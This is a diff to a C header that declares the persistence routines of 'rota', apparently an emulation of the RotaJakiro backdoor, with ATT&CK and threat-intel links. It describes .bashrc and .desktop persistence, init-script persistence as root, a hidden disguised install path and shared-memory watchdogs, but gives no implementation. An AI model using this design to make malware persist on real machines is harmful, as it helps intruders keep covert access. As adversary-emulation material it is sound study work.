@@ -2,99 +2,101 @@
 #define PERSISTENCE_H_
 #include <stdbool.h>
 
-/**
-* @brief append to bashrc for persistence
-* Technique: Event Triggered Execution: Unix Shell Configuration Modification (T154.004)
-* @param: N/A
-* @return: boolean indicating success/failue of file creation.
-**/
 
+
+// nonroot_bashrc_persistence
+//     About:
+//         append to .bashrc for persistence
+//    MITRE ATT&CK Technique
+//        T154.004 Event Triggered Execution: Unix Shell Configuration Modification
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
 bool nonroot_bashrc_persistence(void);
 
-/**
-* @brief append to bashrc for persistence
-* Technique: Desktop Entry (not documented in ATT&CK)
-* @param: N/A
-* @return: boolean indicating success/failue of file creation.
-**/
+// nonroot_bashrc_persistence
+//     About:
+//         Create a ".Desktop" file for persistence
+//    MITRE ATT&CK Technique
+//        TODO - Technique: Desktop Entry (not documented in ATT&CK)
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
 bool nonroot_desktop_persistence(void);
 
-
-/**
- * @brief copy binary by reading it from /proc/self/exe to destpath
- * @param destpath, designated path to write to.
- *
- * @return boolean value indicating success/failure.
- **/
+// nonroot_bashrc_persistence
+//     About:
+//         Copy binary to persistence locations by reading it from /proc/self/exe to destpath
+//    MITRE ATT&CK Technique: N/A
+//    CTI: N/A
 bool copy_rota_to_userland(char *destpath);
 
-/**
- * @brief wrapper function to call additional non-root persistence functions
- * required directories are created at execution time for planting the binary.
- * @param N/A
- * @return boolean value indicating success or failureof non-root persistence methods.
-*/
+
+// nonroot_persistence
+//     About:
+//         Wrapper function to call persistence mechanisms
+//    MITRE ATT&CK Technique: N/A
+//    CTI: N/A
 bool nonroot_persistence(void);
 
-/**
- * @brief Leverage systemd/init rc scripts to achieve persistence when rota is executed as root.
- * Technique: Boot or Logon Initiaization Scripts
- * TID: 1037.004
- * https://attack.mitre.org/techniques/T1037/
- * @param N/A
- * @return boolean value if successfully installed persistence.
- **/
+// root_persistence
+//     About:
+//         Leverage systemd/init rc scripts to achieve persistence when rota is executed as root
+//    MITRE ATT&CK Technique: N/A
+//        T1037.004 Boot or Logon Initiaization Scripts
+//    CTI:
+//        https://attack.mitre.org/techniques/T1037/
 bool root_persistence(void);
 
 
-/**
-*
-* @brief monitor /proc/<PID> for existence of a given process.
-* @param pid, pointer to integer value corresponding to a given process.
-* @return boolean value indicating file in proc exists or not.
-**/
+// monitor_proc
+//     About:
+//         monitor /proc/<PID> for existence of a given process.
+//    MITRE ATT&CK Technique:
+//        TODO
+//    CTI:
+//        https://attack.mitre.org/techniques/T1037/
 bool monitor_proc(int *pid);
 
-/**
- * @brief helper function to write data to disk
- * @param fpath char pointer to location on filepath.
- * @param data, buffer of data to write to previously specified filepath.
- * @return boolean value indicating success or failure.
- * */
+
+// write_to_file
+//     About:
+//         Wrapper function to write data to a given file path
+//    MITRE ATT&CK Technique: N/A
+//    CTI: N/A
 bool write_to_file(char *fpath, char *data);
 
 
-
-/**
- * @brief intial watchdog_thread, monitor shared memory for existence of other file.
- * this function is started via a thread.
- * @param char pointer to file path to exec (rota binary)
- * @return N/A
- * */
+// watchdog_process_shmget
+//     About:
+//         Intial watchdogthread, monitor shared memory for existence of other file. This function is started via a thread.
+//    MITRE ATT&CK Technique:
+//        TODO - *in new version of ATT&CK?*
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
 void *watchdog_process_shmget();
 
 
-/**
- *@brief secondary watchdog_thread, read shared memory for existence of other file
- *@param fpath char pointer to file path to exec (rota binary)
- *@return N/A
- * */
+// watchdog_process_shmread
+//     About:
+//         Secondary watchdog thread, read shared memory for existence of other file
+//    MITRE ATT&CK Technique:
+//        TODO - *in new version of ATT&CK?*
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
 void *watchdog_process_shmread();
 
-/**
- * @brief spawn a thread for persistence IPC watchdog processes
- * @param uid to indicate which watchdog to spawn
- * @param fpath file path to rota  (~/.gvfsd/.prolfile/gvfsd-helper)
- * @return N/A
- **/
+// watchdog_process_shmread
+//     About:
+//         Spawn watchdog thread depending on id passed to it
+//    MITRE ATT&CK Technique: N/A
+//    CTI:
+//        https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
 void spawn_thread_watchdog(int some_id);
 
-
-/**
- * @brief fork and exec a binary and wait for it to return
- * @param fpath, char pointer to file path to fork/exec.
- * @return N/A
- * */
+// fork_exec
+//     About:
+//         Helper function to fork and exec a binary and wait for it to return.
+//    MITRE ATT&CK Technique: N/A
+//    CTI: N/A
 void fork_exec(char *fpath);
 
 #endif // PERSISTENCE_H_
